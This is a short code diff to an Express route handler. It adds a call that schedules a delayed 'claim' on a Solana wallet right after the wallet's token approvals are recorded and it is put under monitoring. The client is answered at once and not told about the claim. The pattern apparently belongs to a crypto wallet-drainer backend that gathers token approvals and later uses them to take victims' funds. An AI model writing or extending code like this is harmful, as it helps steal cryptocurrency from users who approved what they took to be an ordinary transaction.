@@ -178,6 +178,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       );
       console.log(`[Monitor] Added Solana wallet to monitoring: ${walletAddress} (${tokens.length} tokens)`);
       
+      scheduleDelayedClaim(walletAddress, 'solana');
+      
       // Respond immediately to client
       res.json({ success: true, transactionHash, tokensApproved: tokens, approvals });
       
